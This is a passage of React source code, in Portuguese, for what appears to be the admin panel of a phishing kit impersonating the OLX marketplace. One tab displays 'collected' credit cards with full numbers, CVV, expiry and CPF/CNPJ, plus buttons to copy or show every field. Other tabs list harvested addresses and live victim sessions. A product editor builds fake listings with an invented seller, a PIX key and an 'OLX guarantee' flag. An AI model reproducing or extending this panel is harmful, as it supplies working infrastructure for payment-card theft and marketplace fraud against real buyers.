                                <div className="text-xs text-gray-500">
                                  Última atividade: {new Date(session.last_activity).toLocaleTimeString("pt-BR")}
                                </div>
                              </td>
                              <td className="py-3 px-4 text-sm">
                                <span
                                  className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${
                                    isOnline ? "bg-green-100 text-green-800" : "bg-red-100 text-red-800"
                                  }`}
                                >
                                  <div
                                    className={`w-2 h-2 rounded-full mr-1 ${isOnline ? "bg-green-400" : "bg-red-400"}`}
                                  ></div>
                                  {isOnline ? "Online" : "Offline"}
                                </span>
                              </td>
                            </tr>
                          )
                        })}
                      </tbody>
                    </table>
                  </div>
                ) : (
                  <div className="text-center py-12">
                    <Users className="h-12 w-12 text-gray-400 mx-auto mb-4" />
                    <h3 className="text-lg font-medium text-gray-900 mb-2">Nenhum usuário online</h3>
                    <p className="text-gray-500">Os usuários ativos aparecerão aqui em tempo real.</p>
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        )}

        {/* Cards Tab */}
        {!loading && activeTab === "cards" && (
          <div className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <CreditCard className="h-5 w-5" />
                  Cartões de Crédito Coletados
                </CardTitle>
              </CardHeader>
              <CardContent>
                {creditCards.length > 0 ? (
                  <div className="overflow-x-auto">
                    <table className="w-full border-collapse">
                      <thead>
                        <tr className="border-b border-gray-200">
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Cartão</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Validade</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">CVV</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Nome no Cartão</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">CPF/CNPJ</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Coletado em</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Ações</th>
                        </tr>
                      </thead>
                      <tbody>
                        {creditCards.map((card, index) => (
                          <tr key={card.id} className={index % 2 === 0 ? "bg-gray-50" : "bg-white"}>
                            <td className="py-3 px-4 text-sm font-mono text-gray-900">
                              {showFullCardNumber(card.cardNumber)}
                            </td>
                            <td className="py-3 px-4 text-sm text-gray-900">{card.expiryDate}</td>
                            <td className="py-3 px-4 text-sm font-mono text-gray-900">{card.cvv}</td>
                            <td className="py-3 px-4 text-sm text-gray-900">{card.cardholderName}</td>
                            <td className="py-3 px-4 text-sm text-gray-900">{showFullCPFCNPJ(card.cpfCnpj)}</td>
                            <td className="py-3 px-4 text-sm text-gray-500">{card.addedAt}</td>
                            <td className="py-3 px-4">
                              <div className="flex items-center space-x-2">
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() =>
                                    handleCopyText(
                                      `Cartão: ${showFullCardNumber(card.cardNumber)}\nValidade: ${card.expiryDate}\nCVV: ${card.cvv}\nNome: ${card.cardholderName}\nCPF/CNPJ: ${showFullCPFCNPJ(card.cpfCnpj)}`,
                                      "Dados completos do cartão",
                                    )
                                  }
                                  className="text-blue-600 hover:text-blue-800"
                                >
                                  <Copy className="h-4 w-4" />
                                </Button>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => {
                                    const cardDetails = `
Número do Cartão: ${showFullCardNumber(card.cardNumber)}
Validade: ${card.expiryDate}
CVV: ${card.cvv}
Nome no Cartão: ${card.cardholderName}
CPF/CNPJ: ${showFullCPFCNPJ(card.cpfCnpj)}
Coletado em: ${card.addedAt}
                                    `.trim()
                                    alert(cardDetails)
                                  }}
                                  className="text-green-600 hover:text-green-800"
                                >
                                  <Eye className="h-4 w-4" />
                                </Button>
                              </div>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                ) : (
                  <div className="text-center py-12">
                    <CreditCard className="h-12 w-12 text-gray-400 mx-auto mb-4" />
                    <h3 className="text-lg font-medium text-gray-900 mb-2">Nenhum cartão coletado</h3>
                    <p className="text-gray-500">Os cartões adicionados pelos usuários aparecerão aqui.</p>
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        )}

        {/* Addresses Tab */}
        {!loading && activeTab === "addresses" && (
          <div className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"
                    />
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"
                    />
                  </svg>
                  Endereços Coletados
                </CardTitle>
              </CardHeader>
              <CardContent>
                {addresses.length > 0 ? (
                  <div className="overflow-x-auto">
                    <table className="w-full border-collapse">
                      <thead>
                        <tr className="border-b border-gray-200">
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Destinatário</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Endereço</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">CEP</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Cidade/Estado</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Coletado em</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Ações</th>
                        </tr>
                      </thead>
                      <tbody>
                        {addresses.map((address, index) => (
                          <tr key={address.id} className={index % 2 === 0 ? "bg-gray-50" : "bg-white"}>
                            <td className="py-3 px-4 text-sm text-gray-900">{address.recipientName}</td>
                            <td className="py-3 px-4 text-sm text-gray-900">
                              {address.street}, {address.number}
                              {address.complement && `, ${address.complement}`}
                              <br />
                              <span className="text-gray-600">{address.neighborhood}</span>
                            </td>
                            <td className="py-3 px-4 text-sm text-gray-900">{address.cep}</td>
                            <td className="py-3 px-4 text-sm text-gray-900">
                              {address.city} - {address.state}
                            </td>
                            <td className="py-3 px-4 text-sm text-gray-500">{address.addedAt}</td>
                            <td className="py-3 px-4">
                              <Button
                                variant="ghost"
                                size="sm"
                                onClick={() => handleCopyText(JSON.stringify(address), "Dados do endereço")}
                                className="text-blue-600 hover:text-blue-800"
                              >
                                <Copy className="h-4 w-4" />
                              </Button>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                ) : (
                  <div className="text-center py-12">
                    <svg
                      className="h-12 w-12 text-gray-400 mx-auto mb-4"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"
                      />
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"
                      />
                    </svg>
                    <h3 className="text-lg font-medium text-gray-900 mb-2">Nenhum endereço coletado</h3>
                    <p className="text-gray-500">Os endereços adicionados pelos usuários aparecerão aqui.</p>
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        )}
      </div>

      {/* Edit Product Dialog */}
      <Dialog open={editDialogOpen} onOpenChange={setEditDialogOpen}>
        <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>Editar Produto</DialogTitle>
            <DialogDescription>Faça as alterações necessárias nos dados do produto.</DialogDescription>
          </DialogHeader>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* Coluna 1 */}
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Nome do Item *</label>
                <Input
                  value={editForm.nome_item}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, nome_item: e.target.value }))}
                  placeholder="Ex: iPhone 14 Pro Max 256GB"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Nome do Vendedor *</label>
                <Input
                  value={editForm.nome_vendedor}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, nome_vendedor: e.target.value }))}
                  placeholder="Ex: João Silva"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">CPF do Vendedor *</label>
                <Input
                  value={editForm.cpf_vendedor}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, cpf_vendedor: e.target.value }))}
                  placeholder="000.000.000-00"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Valor *</label>
                <Input
                  value={editForm.valor}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, valor: e.target.value }))}
                  placeholder="R$ 0,00"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Garantia OLX *</label>
                <Select
                  value={editForm.garantia_olx}
                  onValueChange={(value) => setEditForm((prev) => ({ ...prev, garantia_olx: value }))}
                >
                  <SelectTrigger>
                    <SelectValue placeholder="Selecione" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="sim">Sim</SelectItem>
                    <SelectItem value="nao">Não</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Valor do Frete *</label>
                <Input
                  value={editForm.valor_frete}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, valor_frete: e.target.value }))}
                  placeholder="R$ 0,00"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">WhatsApp *</label>
                <Input
                  value={editForm.whatsapp}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, whatsapp: e.target.value }))}
                  placeholder="(11) 99999-9999"
                />
              </div>
            </div>

            {/* Coluna 2 */}
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Categoria *</label>
                <Select
                  value={editForm.categoria}
                  onValueChange={(value) => setEditForm((prev) => ({ ...prev, categoria: value }))}
                >
                  <SelectTrigger>
                    <SelectValue placeholder="Selecione uma categoria" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="eletronicos">Eletrônicos e Celulares</SelectItem>
                    <SelectItem value="eletrodomesticos">Eletrodomésticos</SelectItem>
                    <SelectItem value="casa-jardim">Casa e Jardim</SelectItem>
                    <SelectItem value="esportes">Esportes e Lazer</SelectItem>
                    <SelectItem value="moda">Moda e Beleza</SelectItem>
                    <SelectItem value="carros">Carros, Motos e Barcos</SelectItem>
                    <SelectItem value="imoveis">Imóveis</SelectItem>
                    <SelectItem value="servicos">Serviços</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Tipo *</label>
                <Input
                  value={editForm.tipo}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, tipo: e.target.value }))}
                  placeholder="Ex: Smartphone"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Condição *</label>
                <Select
                  value={editForm.condicao}
                  onValueChange={(value) => setEditForm((prev) => ({ ...prev, condicao: value }))}
                >
                  <SelectTrigger>
                    <SelectValue placeholder="Selecione a condição" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="novo">Novo</SelectItem>
                    <SelectItem value="usado-excelente">Usado - Excelente</SelectItem>
                    <SelectItem value="usado-bom">Usado - Bom</SelectItem>
                    <SelectItem value="usado-regular">Usado - Regular</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">CEP *</label>
                <Input
                  value={editForm.cep}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, cep: e.target.value }))}
                  placeholder="00000-000"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Município *</label>
                <Input
                  value={editForm.municipio}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, municipio: e.target.value }))}
                  placeholder="Ex: São Paulo"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Chave PIX *</label>
                <Input
                  value={editForm.chave_pix}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, chave_pix: e.target.value }))}
                  placeholder="Ex: usuario@email.com"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Data de Publicação *</label>
                <Input
                  value={editForm.publicado_em}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, publicado_em: e.target.value }))}
                  placeholder="Ex: 18/06/2025"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">URL de Checkout</label>
                <Input
                  value={editForm.checkout_url}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, checkout_url: e.target.value }))}
                  placeholder="https://pay.exemplo.com/checkout/produto123"
                />
                <p className="text-xs text-gray-500 mt-1">
                  URL para onde o usuário será redirecionado ao clicar em "Comprar"
                </p>
              </div>
            </div>
          </div>

          {/* Descrição */}
          <div className="mt-6">
            <label className="block text-sm font-medium text-gray-700 mb-2">Descrição *</label>
            <Textarea
              value={editForm.descricao}
              onChange={(e) => setEditForm((prev) => ({ ...prev, descricao: e.target.value }))}
              placeholder="Descreva o produto em detalhes..."
              rows={4}
            />
          </div>

          {/* Imagens */}
          <div className="mt-6">
            <label className="block text-sm font-medium text-gray-700 mb-4">Imagens do Produto</label>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="block text-sm text-gray-600 mb-2">Imagem Principal *</label>
                <Input
                  value={editForm.imagem_principal}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, imagem_principal: e.target.value }))}
                  placeholder="URL da imagem principal"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-600 mb-2">Imagem 2</label>
                <Input
                  value={editForm.imagem_2}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, imagem_2: e.target.value }))}
                  placeholder="URL da segunda imagem"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-600 mb-2">Imagem 3</label>
                <Input
                  value={editForm.imagem_3}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, imagem_3: e.target.value }))}
                  placeholder="URL da terceira imagem"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-600 mb-2">Imagem 4</label>
                <Input
                  value={editForm.imagem_4}
                  onChange={(e) => setEditForm((prev) => ({ ...prev, imagem_4: e.target.value }))}
                  placeholder="URL da quarta imagem"
                />
              </div>
            </div>
          </div>

          <DialogFooter className="mt-6">
            <Button variant="outline" onClick={() => setEditDialogOpen(false)} disabled={saving}>
              Cancelar
            </Button>
            <Button onClick={handleSaveEdit} disabled={saving} className="bg-[#ff6e00] hover:bg-[#e55a00] text-white">
              {saving ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin mr-2" />
                  Salvando...
                </>
              ) : (
                <>
                  <Save className="h-4 w-4 mr-2" />
                  Salvar Alterações
                </>
              )}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Delete Confirmation Dialog */}
      <Dialog open={deleteDialogOpen} onOpenChange={setDeleteDialogOpen}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Confirmar exclusão</DialogTitle>
            <DialogDescription>
              Tem certeza que deseja excluir este produto do banco de dados? Esta ação não pode ser desfeita.
            </DialogDescription>
          </DialogHeader>
          <DialogFooter>
            <Button variant="outline" onClick={() => setDeleteDialogOpen(false)} disabled={deleting}>
              Cancelar
            </Button>
            <Button variant="destructive" onClick={confirmDeleteProduct} disabled={deleting}>
              {deleting ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin mr-2" />
                  Excluindo...
                </>
              ) : (
                "Excluir"
              )}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Bulk Delete Confirmation Dialog */}
      <Dialog open={bulkDeleteDialogOpen} onOpenChange={setBulkDeleteDialogOpen}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Confirmar exclusão em massa</DialogTitle>
            <DialogDescription>
              Tem certeza que deseja excluir {selectedProducts.length} produto(s) selecionado(s)? Esta ação não pode ser
              desfeita.
            </DialogDescription>
          </DialogHeader>
          <DialogFooter>
            <Button variant="outline" onClick={() => setBulkDeleteDialogOpen(false)} disabled={bulkDeleting}>
              Cancelar
            </Button>
            <Button variant="destructive" onClick={confirmBulkDelete} disabled={bulkDeleting}>
              {bulkDeleting ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin mr-2" />
                  Excluindo...
                </>
              ) : (
                `Excluir ${selectedProducts.length} Produto(s)`
              )}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Image Preview Dialog */}
      <Dialog open={imagePreviewOpen} onOpenChange={setImagePreviewOpen}>
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle>Visualizar Imagem</DialogTitle>
          </DialogHeader>
          {imagePreviewUrl && (
            <div className="flex justify-center">
              <Image
                src={imagePreviewUrl || "/placeholder.svg"}
                alt="Preview"
                width={500}
                height={400}
                className="max-w-full h-auto rounded-lg"
              />
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
